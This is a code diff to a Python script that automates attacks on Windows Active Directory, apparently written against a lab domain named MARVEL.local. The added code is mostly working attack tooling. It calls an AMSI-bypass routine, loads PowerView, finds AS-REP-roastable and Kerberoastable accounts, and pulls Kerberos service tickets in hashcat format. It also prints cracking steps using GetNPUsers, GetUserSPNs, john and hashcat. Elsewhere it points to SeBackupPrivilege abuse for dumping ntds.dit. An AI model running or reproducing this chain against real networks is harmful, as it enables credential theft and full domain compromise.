@@ -5,7 +5,7 @@ import time,os,sys
 #Starting with the hacking 
 def stepFOUR_PrivilegeEsc():
     print(f"\n{ok} 4-Starting with elevate privileges to local administrator...\n")
-    print(f"{warning} 1-Check Unquoted path services vulnerabilities...")
+    print(f"{warning} A-Check Unquoted path services vulnerabilities...")
     checking=0
     while(checking==0):
         time.sleep(2)
@@ -34,7 +34,8 @@ def stepFOUR_PrivilegeEsc():
             print(f"{error} No service unquoted FOUND")
             checking=1
     
-    print(f"\n{warning} 2-Check writeable Service Executable...")
+    time.sleep(1)
+    print(f"\n{warning} B-Check writeable Service Executable...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -58,9 +59,71 @@ def stepFOUR_PrivilegeEsc():
             x=input(f"{ok} When you finished press ENTER..\n")
     except Exception as e:
         print(f"{error} No writeable service executable FOUND")
-
     
-    print(f"\n{warning} 3-Check SeBackupPrivilege to Windows PrivEsc...")
+    time.sleep(1)
+    print(f"\n{warning} C- Check AS-REP Roasting on the domains...")
+    time.sleep(1)
+    print(f"{ok} Bypassing AMSI Security...\n")
+    bypass=configurazione()
+    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command1=command0 + 'Get-DomainUser -PreauthNotRequired | select displayname,userprincipalname,useraccountcontrol '
+    try:
+        value=powershell_commandLine(command1)
+        value=cleanstring(value)
+        print(value)
+        value=value.split("\n")
+        if(len(value) == 1):
+            print(f"{error} No users with preauthnotrequired FOUND\n")
+            print(f"{ok} 1- GETNPUsers MARVEL.local/jsmith -dc-ip=192.168.73.137 ")
+            print(f"{ok} 2- Save the password in a file called tgt")
+            print(f"{ok} 3- Use John or whatever bruteforce tool to crack password offline: sudo john tgt --wordlist=rockyou")
+        else:
+            print(f"\n{ok} Users with preauthnotrequired FOUND\n")
+    except Exception as e:
+        print(f"{error} General Error: {e}")
+
+    time.sleep(1)
+    
+    print(f"\n{warning} D- Check abuse Kerberoasting...")
+    time.sleep(1)
+    print(f"{ok} Bypassing AMSI Security...\n")
+    bypass=configurazione()
+    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command1=command0 + 'Get-NetUser -SPN | select serviceprincipalname '
+    try:
+        value=powershell_commandLine(command1)
+        value=cleanstring(value)
+        print(value)
+        value=value.split("\n")
+        if(len(value) == 1):
+            print(f"{error} No Service Account  FOUND\n")
+            
+        else:
+            print(f"\n{ok} Service Account FOUND\n")
+            print(f"{ok} 1- GETUserSPN -dc-ip 192.168.73.137 MARVEL.local/(account in the domain) -request ")
+            print(f"{ok} 2- Save the TGS encrypted in a file like hash.txt")
+            print(f"{ok} 3- hashcat -m 13100 -a 0 hash.txt password --force")
+            print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            bypass=configurazione()
+            command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+            command1=command0 + 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat '
+            try:
+                value=powershell_commandLine(command1)
+                value=cleanstring(value)
+                print(value)
+                value=value.split("\n")
+                if(len(value) == 1):
+                    print(f"\n{error} No Hashcat TGS FOUND\n")
+                else:
+                    print(f"\n{ok} Hashcat TGS FOUND\n")
+            except Exception as e:
+                print(f"{error} General Error: {e}")
+    except Exception as e:
+        print(f"{error} General Error: {e}")
+
+    time.sleep(1)
+
+    print(f"\n{warning} E- Check SeBackupPrivilege to Windows PrivEsc...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -72,9 +135,9 @@ def stepFOUR_PrivilegeEsc():
         print(value)
         value=value.split("\n")
         if(len(value) == 1):
-            print(f"{error} No users in Backup Operators FOUND")
+            print(f"\n{error} No users in Backup Operators FOUND\n")
         else:
-            print(f"{ok} User in Backup Operators FOUND\n")
+            print(f"\n{ok} User in Backup Operators FOUND\n")
             time.sleep(2)
             command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
             command1=command0 + 'Get-NetGroupMember -Name "Remote Management Users"'
@@ -83,15 +146,15 @@ def stepFOUR_PrivilegeEsc():
             print(value)
             value=value.split("\n")
             if(len(value) == 1):
-                print(f"{error} No users in Remote Management Users FOUND")
+                print(f"\n{error} No users in Remote Management Users FOUND\n")
             else:
-                print(f"{ok} User in Remote Management Users FOUND\n")
+                print(f"\n{ok} User in Remote Management Users FOUND\n")
                 print(f"{ok} You can exploit the vulnerability of SeBackupPrivilege to dump ntds.dit and system to get hash")
     except Exception as e:
-        print(f"{error} General Error")
+        print(f"{error} General Error: {e}")
 
 
-
+    
     sys.exit(0)
     print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
     print(f"{ok} Invoke-UserHunter take a few minutes to check all machines...")
@@ -118,8 +181,8 @@ if __name__=="__main__":
     print("\n============================================================================\n")
     stepTWO_Installing_tools()
     time.sleep(1)
-    #print("\n============================================================================\n")
-    #StepTHREE_Enumeration()
-    #time.sleep(1)
+    print("\n============================================================================\n")
+    StepTHREE_Enumeration()
+    time.sleep(1)
     print("\n============================================================================\n")
     stepFOUR_PrivilegeEsc()
